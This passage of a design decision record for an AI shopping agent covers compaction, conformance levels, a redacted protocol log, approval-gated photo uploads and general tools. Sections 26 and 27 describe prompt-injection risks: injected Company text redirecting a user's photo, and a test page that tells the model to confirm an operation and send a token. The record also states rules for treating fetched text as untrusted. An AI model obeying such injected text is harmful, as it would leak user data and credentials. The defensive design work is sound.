  - **Preserved thinking.** pi-ai's Anthropic catalog marks Sonnet 5.5 `supportsMidConvoEffort`, and for such models pi-ai asks Anthropic to drop a thinking block whose earlier context changed (`block_binding: { prefix_mismatch_behavior: "drop_block" }`, with the `thinking-binding-controls-2026-08-01` beta) instead of refusing the request. Its Cloudflare AI Gateway entry for the same model lacks the flag, so after a compaction a demo-lane request carrying kept thinking blocks could have been refused with a 400, again on every turn. The demo model now takes the compat flags of the vendor's own entry (`withVendorCompat` in `src/model-router.ts`), so the demo lane sends what the own-key lane sends.
- **Alternatives.**
  - *pi's defaults:* compaction near 950k tokens, at the price of a near-1M-token request on every turn before it.
  - *pi's built-in summarizer:* no way to keep Company text apart, short of matching its prompt in the router.
  - *A cheaper model for summaries:* pi-durable's built-in summarizer always uses the conversation's own model, but our hook chooses its model, so a cheaper one is a small change once a second lane model exists. Not done: the router has one model per lane, and the demo caps already meter summaries.
  - *Leaving the gateway entry as it is:* a demo-lane conversation could have failed for good after its first compaction.
- **Consequences.** Summary calls don't appear in pi's own usage document (the hook makes them), though they are in the demo's ledger. The fix for preserved thinking depends on AI Gateway passing the `anthropic-beta` header and the body to Anthropic unchanged, which is untried until the demo gateway has credits ([deployment-tasks.md](deployment-tasks.md)). A summary is a model's account and can be wrong; what is open at Companies is in the `poppy_*` tables, never only in the transcript.
- **When.** 12 October.

## 24. Conformance levels from each requirement's basis

- **Context.** The mock Company, the validator and the grid's attribution each graded findings in their own way. The mock recorded every check as a violation, and a hand-kept `STRICT_ONLY` list hid seven of them from the lenient reference Company. Most validator errors were "what our client refuses", and some of those rested only on the Guides or our readings. The runner made every Company-recorded check an error. [spec/grounding.md](../spec/grounding.md) left the owner four questions about this: keyword-less rules, Guides and readings in the mock; validator severities; grid attribution; and scenario YK.
- **Decision.** One policy, [conformance-levels.md](conformance-levels.md), coded once in `src/validator/levels.ts`:
  - **Failure.** MUST, an RFC's MUST, and normative statements without a key word (RFC 8174: normative text needn't use the key words). These are mock violations, validator errors and cell failures.
  - **Warning.** SHOULD and the Guides ("a recommendation, in the sense of SHOULD"). These never fail anything.
  - **Tentative.** Our readings, like WPT's `.tentative`. Reported as warnings; a failure they cause is the spec's.
  - **Nothing.** MAY.
  - **Strict runs.** Our own code is held to warnings too (h2spec's `--strict`): the conformance tests' `afterEach` and `poppy-validate --strict`.
  - **Behaviour stays separate.** A refusal made for safety stays, but its verdict follows its basis. The validator's `refuses` flag says what our client refuses, apart from severity. YK is `permitted_by: N5`.
- **Alternatives.**
  - *Every SHOULD a failure, as WPT does.* This would fail other projects' cells over recommendations the draft says they may decline.
  - *Don't check SHOULDs unless strict, as h2spec does.* We'd lose the warnings in the grid, where they are evidence for spec issues.
  - *Keep hand lists.* They drift from the catalog. `STRICT_ONLY` was already an approximation of "SHOULD or Guides, refuses nothing".
  - *Make the validator's errors mean "our client refuses".* That calls our hardening the draft's requirement, which is the confusion the grounding found.
- **Consequences.**
  - The mock's 144 checks: 117 violations and 27 warnings.
  - The validator: 9 errors became warnings, and our client still refuses every one. 4 warnings or info messages became errors, and our client tolerates every one. 4 messages are new. Fetch limits now make a report indeterminate.
  - The grid: 8 trace checks became warnings, `company.retry-after` became an error, and there is a new attribution rule, `warning`. `results.json` counts checks per level.
  - The full grid has since run again under the policy, and every interop cell's outcome stayed the same ([interop-results](interop-results/README.md)).
- **When.** 12 October 2026.

## 25. A protocol view in Activity

- **Context.** The project's audience is now the Poppy spec's authors and other implementers, and its demo is ordering a print from print-with-poppy. They want to see the protocol, not only outcomes: which requests the agent made, in what order, under which section of the draft, and how each was answered. Activity showed outcomes only. Anything recorded about requests sits next to tokens, proofs and codes, which must never be kept.
- **Decision.** A per-agent, per-Company log in the agent's own SQLite (`poppy_protocol_log`, `src/poppy/protocol-log.ts`), shown in Activity as a "Protocol" disclosure per Company, with "Copy as text" and "Download .txt" for interop reports.
  - **Where it's written.** In the one Poppy HTTP client (`client.ts`), one row per attempt, so nonce retries, `Retry-After` waits and Session restarts show; and in discovery, from the validator's report. Triggers on the sign-in, conversation and operation tables add state changes no request makes, so `signin.ts`, `conversations.ts` and `operations.ts` need no hooks. `apis.ts` only exports a function that names a call by its `operationId` and path template.
  - **What's in it.** A whitelist: a step that maps to its spec section, method, origin and path, status, error code, and two lines built field by field from named values. Never a header, body, token, assertion, proof, key, code, `state`, verifier, sign-in value, cursor or query string. The one-time-code URL, which holds the sealed `sign_in_id`, is logged as a template.
  - **Bounds.** 500 rows per Company, pruned by a trigger. Keyed by issuer, or by domain for a Company discovery refused.
  - **To the page.** A small index frame on connect and when it changes; a Company's entries only when its disclosure opens, and again when its newest row moves.
- **Alternatives.**
  - *Log through the existing Activity frame.* The frame is sent on every change; 500 rows per Company in it would go out after every conversation read.
  - *Record the HAR the interop proxy records.* That has headers and bodies; redacting after the fact fails open.
  - *Hooks in each module instead of triggers.* More call sites, in files another change is editing, and a missed one is a silent gap; a trigger can't miss a status change.
  - *Workers Logs.* Not per person, and not something the page can show.
- **Consequences.** A test feeds every secret kind the other secret checks use through Direct, Device and Mediated Sign-In, conversations, an operation, MCP and signing out, collects every secret that crossed the wire in the test's fetcher, and finds none in a row or a frame; a deliberately leaked `sign_in_id` fails it. OpenAPI and MCP metadata fetches, and website pages other than their 429 and 503 answers, aren't logged yet. The rows are about the person's own activity, so they go when the agent is deleted.
- **When.** 12 October (`0960853`).

## 26. Photos in the chat, uploaded only with the User's approval

- **Context.** The demo journey the owner chose is print-with-poppy: "print this photo as a 6×4". The store takes a photo as `multipart/form-data` (`POST /api/photos`, field `photo`), then `POST /api/orders` proposes an Operations v1 operation in a signed-out Session ([its adapter's README](../interop/impls/print-with-poppy-company/README.md)). The page had no way to attach a file, the OpenAPI tool sent only JSON, and the files copied from Cloudflare's example can't change. A photo is the User's data, and the Operations extension covers what a Company does, not what we send it: at a Company with the extension, our writes went straight through.
- **Decision.**
  - **Storage.** `src/attachments.ts` keeps each photo in the agent's own SQLite, in 1 MiB rows under the 2 MB row limit: JPEG, PNG, WebP or GIF by their first bytes, at most 10 MiB each (the store takes 20 MB), 100 MiB an agent, deleted after 30 days and with the agent. `POST /api/attachments` (same origin) stores one, `GET` serves it back to its owner's page with `nosniff` and a sandboxing CSP, `DELETE` removes one.
  - **The model.** The page adds a marker to the message, `[attachment att_… · lake.jpg · image/jpeg · 2.4 MB]`, which the upstream protocol carries as text. A pi `beforeRequest` hook (`src/attachment-images.ts`) shows the model the page's smaller copy as an image in that message, on each request, for the four newest attachments, and only in the User's own messages. Tools name an attachment by its id; the model never holds the bytes.
  - **Uploads.** `poppy_api_call` takes `files: { field: attachment id }` for an operation whose request body is `multipart/form-data`; the client builds the form from the stored bytes when it sends. Every upload waits for the User's approval on a card that shows the photo, at every Company, operations or not, after the server is checked against the Company's hosts (N10). The card is fixed per tool call, so a replay shows the same one.
  - **Signed-out operations (N19).** An operation the Company no longer has (`operation_not_found`) is final for us: nothing confirms, reads or cancels it again, its card says whether it may have happened, and it no longer blocks a new proposal ([readings.md](readings.md#n19)).
- **Alternatives.**
  - *Images in the transcript,* as an image part of the submitted input, which pi and the upstream protocol carry: every page snapshot and every request would carry the bytes, and deleting a photo wouldn't remove it.
  - *R2:* one person's few photos fit the Durable Object; R2 adds a binding, a second place to delete from, and per-object access rules for no gain at this size.
  - *Resizing in the Worker:* workerd has no image library; the browser already decodes the photo, so the page makes the preview, and an agent whose page couldn't shows the model the file only when it is under 1 MiB.
  - *Letting uploads through at Operations Companies,* like other writes: the photo would leave the agent on the model's word alone, and a Company's injected text could name the User's photo for another Company.
- **Consequences.** The demo journey has two approvals: sending the photo, then the order's terms. It stays at two now that writes at an Operations Company need their description to say they propose (decision [6](#6-prompt-injection-defences-that-are-structural)): print-with-poppy's `POST /api/orders` documents a 202 with an `operation`, and the mock's print shop mirrors it. An operation marked lost is final in Activity and `poppy_status` too (12 October). HEIC photos aren't taken; browsers convert them for an `accept` list without HEIC.
- **When.** 12 October 2026.

## 27. General tools beside Poppy: read_url, memory, time and maths

- **Context.** The owner wanted the agent useful away from Companies: reading a page someone links, remembering what they say, and getting dates and sums right. The Poppy tools can't do any of it. Each new tool is also a new way for injected text to reach the model, or for the model to send something out, and the rules the Poppy tools follow (no credential in or out, Company text never the User's approval, a replay that repeats nothing harmful) have to hold for these too.
- **Decision.** Three pi extensions in `src/tools/`, installed beside `poppy` (`src/tools/extensions.ts`):
  - **`web`: `read_url(url)`** (`src/tools/web.ts`). A GET with only `Accept` and a `User-Agent` naming the agent, through the agent's own `webFetcher()`, never the Poppy fetcher, so no Session, cookie or token can reach it. HTTPS on the standard port, no user name or password in the URL, a public host by the validator's `isPublicHost`, and the same checks on each of at most 5 redirects; Workers refuse private destinations themselves. 15 seconds in all, the first 1 MB read, 20,000 characters to the model, HTML, text, JSON and XML only, 30 reads a minute per agent. HTML is reduced with `HTMLRewriter` to headings, paragraphs, list items and numbered links. The result is fenced and labelled untrusted, and kept with the tool call (`api.memo`), so a replay returns it without fetching again. The tool line shows the address, status and size, never the content.
  - **`memory`: `remember(text, source)`, `recall(query?)`, `forget(id)`** (`src/tools/memory-store.ts`). A `memories` table in the agent's SQLite: one fact a note, 500 characters, 200 notes, whose (`user` or `agent`) and when. Secret-looking text is refused with the reason. Full means refused, never evicted. The newest 50 notes, within about 2,000 characters, go in the extension's prompt section, which isn't part of the transcript, so they survive compaction. Settings lists them with Delete and "Forget everything", through `GET`/`DELETE /api/memories`.
  - **`time`: `now`, `date_math`, `calculate`** (`src/tools/clock.ts`, `src/tools/calculate.ts`). Pure code. Time zones from `Intl`, the User's from the page's `poppy.context`. `calculate` is a recursive-descent parser evaluated with exact BigInt fractions.
- **Choices inside it.**
  - **A separate HTML reader** rather than the browser's `parseHtml`: `read_url` drops navigation, headers, footers and asides and marks headings and list items, which the browser must not do, because it has to show every link and form a `click` or `submit` can name. Both use the browser's `decodeEntities`.
  - **Refusals over guesses.** An HTTP error, a type that isn't text, and a URL with credentials are refused by name; the model can say so to the User.
  - **The rate limit is in memory**, per agent: an evicted agent starts a fresh minute, which costs a site at most another 30 requests.
  - **Whose a note is, enforced where it can be.** The prompt and the description say a Company's or a page's text is never the User's preference. A `beforeRequest` hook also notes whether the running turn began with a Company message or one of the agent's notices (they start with `[`); then a note claimed as the User's is saved as the agent's. It can't tell a page the User asked for from the User, so Settings shows whose each note is.
  - **Exact sums, approximate only where they must be.** Fractions of BigInts make `0.1 + 0.2` exactly `0.3` and money exact to the cent; only `sqrt`, a fractional power, `pi`, `e` and an answer that doesn't end within 20 decimal places are rounded, to 15 significant digits, and the result says `exact: false`. `%` after a number is percent and `mod` is the remainder, so `10 % 3` can't mean two things. Rounding is half away from zero, as money is rounded.
  - **Dates the way calendars count them.** Months clamp to the month's end, wall-clock days survive a clock change, elapsed hours don't; a skipped time moves forward and a repeated one takes the earlier instant (Temporal's "compatible"). Offsets are kept to the second, because the property tests found St John's 1935 offset of −3:30:52.
- **Alternatives.**
  - *A search tool.* It needs a search provider and an API key the operator pays for; reading a page the User names costs nothing. Left for later ([TODO](../TODO.md)).
  - *`read_url` through the Poppy browser.* It holds a Session's cookies and is limited to a Company's own hosts; sharing it would put Company state one bug away from an arbitrary site.
  - *Memory as key and value* (`remember(key, value)`, the earlier plan in the spec): keys the model invents drift ("diet", "dietary", "food"), and a short sentence with an id is what the User reads in Settings anyway.
  - *Evicting the oldest note when full:* silent loss of something the User asked to keep.
  - *`eval` or `Function` for sums, or floating point:* the first runs code the model wrote; the second makes `0.1 + 0.2` `0.30000000000000004`.
  - *Temporal for dates:* not in Node 24, which the property tests run in, nor reliably in workerd.
- **Consequences.** The model is offered 21 tools, and a test checks that exact list, so a tool added by a dependency would fail it. A page read with `read_url` is one more source of injected text; a prompt-injection test serves one that tells the model to confirm an operation and send a token, and nothing is confirmed or sent. Memory is the first User data the User can delete themselves; the privacy policy says so. The User's time zone lives in memory only, so a background turn after an eviction answers in UTC until the page reconnects.
- **When.** 12 October 2026.
